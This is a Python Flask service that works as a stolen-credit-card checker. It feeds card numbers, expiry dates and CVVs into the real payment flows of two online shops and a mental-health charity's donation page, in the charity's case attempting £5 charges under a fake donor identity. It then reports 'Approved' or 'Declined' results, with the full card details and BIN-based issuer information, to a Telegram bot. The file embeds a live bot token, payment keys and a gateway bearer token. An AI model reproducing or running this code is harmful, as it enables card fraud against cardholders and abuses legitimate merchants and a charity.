from flask import Flask, request, jsonify
import requests
import re
import threading

app = Flask(__name__)

BOT_TOKEN = '8381152909:AAHZr5A9GrZcl9ieGWRt_GKuWYx8H5KFwMo'
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"

def stripe_auth_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'})
    if len(yy) == 4: yy = yy[-2:]
    try:
        payment_page_res = session.get('https://shop.wiseacrebrew.com/account/add-payment-method/')
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match: 
            return {"status": "Declined", "response": "Process Error: Failed to get payment nonce."}
        
        ajax_nonce = payment_nonce_match.group(1)
        stripe_data = (f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy')
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
        
        if stripe_response.status_code == 402: 
            try:
                error_data = stripe_response.json()
                if isinstance(error_data, dict):
                    error_msg = error_data.get('error', {}).get('message', 'Declined by Stripe.')
                else:
                    error_msg = 'Declined by Stripe.'
                return {"status": "Declined", "response": error_msg}
            except:
                return {"status": "Declined", "response": "Declined by Stripe."}
        
        try:
            stripe_data = stripe_response.json()
            if not isinstance(stripe_data, dict):
                return {"status": "Declined", "response": "Process Error: Invalid Stripe response."}
            payment_token = stripe_data.get('id')
        except:
            return {"status": "Declined", "response": "Process Error: Failed to parse Stripe response."}
        
        if not payment_token: 
            return {"status": "Declined", "response": "Process Error: Failed to retrieve Stripe token."}
        
        site_data = {
            'action': 'create_and_confirm_setup_intent', 
            'wc-stripe-payment-method': payment_token, 
            'wc-stripe-payment-type': 'card', 
            '_ajax_nonce': ajax_nonce
        }
        final_response = session.post('https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data)
        
        try:
            response_json = final_response.json()
            if not isinstance(response_json, dict):
                return {"status": "Declined", "response": "Process Error: Invalid website response."}
        except:
            return {"status": "Declined", "response": "Process Error: Failed to parse website response."}
        
        if response_json.get('success') is False or response_json.get('status') == 'error':
            error_message = response_json.get('data', {}).get('error', {}).get('message')
            if not error_message:
                messages = response_json.get('messages', 'Declined by website.')
                if isinstance(messages, str):
                    error_message = re.sub('<[^<]+?>', '', messages)
                else:
                    error_message = str(messages)
            return {"status": "Declined", "response": error_message.strip()}
        
        if response_json.get('status') == 'succeeded': 
            return {"status": "Approved", "response": "Payment method successfully added."}
        
        return {"status": "Declined", "response": "Unknown response from website."}
        
    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}"}

def braintree_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'})
    if len(yy) == 4: yy = yy[-2:]
    try:
        graphql_headers = {
            'accept': '*/*',
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTk1NTAxNzUsImp0aSI6IjM3M2VjOGQ1LTMxMzEtNDBhYS05NzFlLTQxNTM5MmNkN2FiZiIsInN1YiI6Ijg1Zmh2amhocTZqMnhoazgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1Zmh2amhocTZqMnhoazgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwiQ2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.qkEHNipXBchl8xjidyqyGihNP0rnwVWr-7yYM_CEDphT1ewsLC1pi2b6G_9kUgOshdP1HzTdBt7ijMEixhibqA',
            'braintree-version': '2018-05-10', 
            'content-type': 'application/json', 
            'origin': 'https://assets.braintreegateway.com',
        }
        graphql_json_data = {
            'clientSdkMetadata': {'sessionId': '234e1f44-db37-4aa5-998c-0a563f9e2424'},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv}}},
            'operationName': 'TokenizeCreditCard',
        }
        graphql_response = session.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_json_data)
        
        try:
            response_data = graphql_response.json()
            if not isinstance(response_data, dict):
                return {"status": "Declined", "response": "Process Error: Invalid Braintree response."}
        except:
            return {"status": "Declined", "response": "Process Error: Failed to parse Braintree response."}
        
        if 'errors' in response_data: 
            errors = response_data['errors']
            if errors and isinstance(errors, list) and len(errors) > 0:
                error_msg = errors[0].get('message', 'Braintree error') if isinstance(errors[0], dict) else str(errors[0])
                return {"status": "Declined", "response": error_msg}
            return {"status": "Declined", "response": "Braintree error"}
        
        if 'data' not in response_data or 'tokenizeCreditCard' not in response_data['data']:
            return {"status": "Declined", "response": "Process Error: No payment token received."}
            
        payment_nonce = response_data['data']['tokenizeCreditCard'].get('token')
        if not payment_nonce:
            return {"status": "Declined", "response": "Process Error: Failed to get payment nonce."}
        
        login_page_res = session.get('https://altairtech.io/account/add-payment-method/')
        site_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', login_page_res.text)
        if not site_nonce_match: 
            return {"status": "Declined", "response": "Process Error: Could not get website nonce."}
        
        site_nonce = site_nonce_match.group(1)
        site_data = {
            'payment_method': 'braintree_credit_card',
            'wc_braintree_credit_card_payment_nonce': payment_nonce,
            'woocommerce-add-payment-method-nonce': site_nonce,
            'woocommerce_add_payment_method': '1',
        }
        final_response = session.post('https://altairtech.io/account/add-payment-method/', data=site_data)
        html_text = final_response.text
        
        match = re.search(r'Status code\s*([^<]+)\s*</li>', html_text)
        if match: 
            return {"status": "Declined", "response": match.group(1).strip()}
        elif "Payment method successfully added." in html_text: 
            return {"status": "Approved", "response": "Payment method successfully added."}
        
        return {"status": "Declined", "response": "Unknown response from website."}
        
    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}"}

def stripe_charge_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'})
    if len(yy) == 4: yy = yy[-2:]
    try:
        save_headers = {
            'content-type': 'application/json', 
            'origin': 'https://www.suffolkmind.org.uk', 
            'referer': 'https://www.suffolkmind.org.uk/donate/'
        }
        save_data = {
            "donationamount": 5, 
            "paymentmethod": 1, 
            "forename": "Joynul", 
            "surname": "Abedin", 
            "email": "joynul@gmail.com", 
            "address1": "New York", 
            "postcode": "10080", 
            "marketing_optin_privacy": True
        }
        save_res = session.post('https://www.suffolkmind.org.uk/wp-json/donation/v1/save/', headers=save_headers, json=save_data)
        
        try:
            save_response_data = save_res.json()
            if not isinstance(save_response_data, dict):
                return {"status": "Declined", "response": "Process Error: Invalid save response"}
            donation_id = save_response_data.get('id')
        except:
            return {"status": "Declined", "response": "Process Error: Failed to parse save response"}
        
        if not donation_id:
            return {"status": "Declined", "response": "Process Error: Failed to get donation ID"}
        
        setup_data = {
            "amount": 5, 
            "donation_id": donation_id, 
            "description": "Suffolk Mind Donation", 
            "email": "joynul@gmail.com", 
            "forename": "Joynul", 
            "surname": "Abedin"
        }
        setup_res = session.post('https://www.suffolkmind.org.uk/wp-json/donation/v1/setup_stripe/', headers=save_headers, json=setup_data)
        
        try:
            setup_response_data = setup_res.json()
            if not isinstance(setup_response_data, dict):
                return {"status": "Declined", "response": "Process Error: Invalid setup response"}
            client_secret = setup_response_data.get('client_secret')
        except:
            return {"status": "Declined", "response": "Process Error: Failed to parse setup response"}
            
        if not client_secret:
            return {"status": "Declined", "response": "Process Error: No client secret received"}
            
        pi_id = client_secret.split('_secret_')[0]
        confirm_headers = {'content-type': 'application/x-www-form-urlencoded'}
        confirm_data = (f'payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_O45qBcmyO7GC7KkMKzPtpRsl&client_secret={client_secret}')
        
        confirm_res = session.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=confirm_headers, data=confirm_data)
        
        try:
            response_json = confirm_res.json()
            if not isinstance(response_json, dict):
                return {"status": "Declined", "response": f"Process Error: Unexpected response type: {type(response_json)}"}
        except ValueError:
            return {"status": "Declined", "response": "Process Error: Invalid JSON response from Stripe"}
        
        if 'error' in response_json:
            error_msg = response_json['error']
            if isinstance(error_msg, dict):
                message = error_msg.get('message', 'An unknown error occurred.')
            else:
                message = str(error_msg)
            return {"status": "Declined", "response": message}
        elif response_json.get('status') == 'succeeded': 
            return {"status": "Approved", "response": "Donation of £5 successful."}
        elif response_json.get('status') == 'requires_action': 
            return {"status": "Declined", "response": "3D Secure Required."}
        else:
            return {"status": "Declined", "response": f"Unexpected status: {response_json.get('status', 'unknown')}"}
            
    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        if response.status_code == 200:
            bin_data = response.json()
            return bin_data if isinstance(bin_data, dict) else {}
        return {}
    except Exception:
        return {}

def background_task(chat_id, message_id, full_cc_string, gateway_function, gateway_name):
    try:
        if not full_cc_string or '|' not in full_cc_string:
            raise ValueError("Invalid card format")
            
        cc, mm, yy, cvv = full_cc_string.split('|')
        check_result = gateway_function(cc, mm, yy, cvv)
        
        if not isinstance(check_result, dict):
            check_result = {"status": "Declined", "response": "Invalid check result format"}
            
        status = check_result.get('status', 'Declined')
        response_message = check_result.get('response', 'No response.')
        
        bin_info = get_bin_info(cc[:6])
        if not isinstance(bin_info, dict):
            bin_info = {}
            
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        country = bin_info.get('country_name', 'Unknown')
        country_flag = bin_info.get('country_flag', '')
        bank = bin_info.get('bank', 'Unknown')
        
        if status == "Approved":
            final_message = f"""<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ({gateway_name})</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response_message}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""
        else:
            final_message = f"""<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ({gateway_name})</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response_message}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""
        
        payload = {
            'chat_id': chat_id, 
            'message_id': message_id, 
            'text': final_message, 
            'parse_mode': 'HTML'
        }
        requests.post(TELEGRAM_API_URL, json=payload)
        
    except Exception as e:
        error_message = f"""<b>Error ❌ ({gateway_name})</b>\n\n<b>Card:</b> <code>{full_cc_string if 'full_cc_string' in locals() else 'N/A'}</code>\n<b>Error:</b> {str(e)}"""
        payload = {
            'chat_id': chat_id, 
            'message_id': message_id, 
            'text': error_message, 
            'parse_mode': 'HTML'
        }
        requests.post(TELEGRAM_API_URL, json=payload)

@app.route('/stripe_auth', methods=['GET'])
def stripe_auth_endpoint():
    card_str = request.args.get('card')
    if not card_str or not re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str): 
        return jsonify({"error": "Invalid card format."}), 400
    
    cc, mm, yy, cvv = card_str.split('|')
    check_result = stripe_auth_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])
    
    final_result = {
        "status": check_result["status"], 
        "response": check_result["response"], 
        "bin_info": bin_info
    }
    return jsonify(final_result)

@app.route('/braintree', methods=['POST'])
def braintree_endpoint():
    data = request.get_json()
    if not data or 'card' not in data: 
        return jsonify({"error": "Missing card data."}), 400
    
    thread = threading.Thread(
        target=background_task, 
        args=(data['chat_id'], data['message_id'], data['card'], braintree_check, "Braintree")
    )
    thread.start()
    return jsonify({"status": "Process started."})

@app.route('/stripe_charge', methods=['POST'])
def stripe_charge_endpoint():
    data = request.get_json()
    if not data or 'card' not in data: 
        return jsonify({"error": "Missing card data."}), 400
    
    thread = threading.Thread(
        target=background_task, 
        args=(data['chat_id'], data['message_id'], data['card'], stripe_charge_check, "Stripe Charge")
    )
    thread.start()
    return jsonify({"status": "Process started."})

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "healthy", "message": "API is running"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
